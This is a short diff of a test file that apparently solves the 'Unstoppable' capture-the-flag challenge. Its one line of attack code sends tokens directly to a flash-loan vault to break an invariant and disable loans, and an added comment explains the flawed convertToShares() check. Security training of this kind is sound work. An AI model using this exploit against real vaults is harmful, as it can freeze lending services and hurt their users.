@@ -52,7 +52,10 @@ describe("[Challenge] Unstoppable", function () {
 	});
 
 	it("Execution", async function () {
-		// Direct transfer tokens into vault to break invariant & disable loans
+		// Direct transfer tokens into vault to break invariant
+        // Invariant includes logic error, calling convertToShares() w/ 
+        // totalSupply (total shares issued) instead of some value representng 
+        // the asset held in the vault
 		await token.connect(player).transfer(vault.address, 5n * 10n ** 18n);
 	});
 
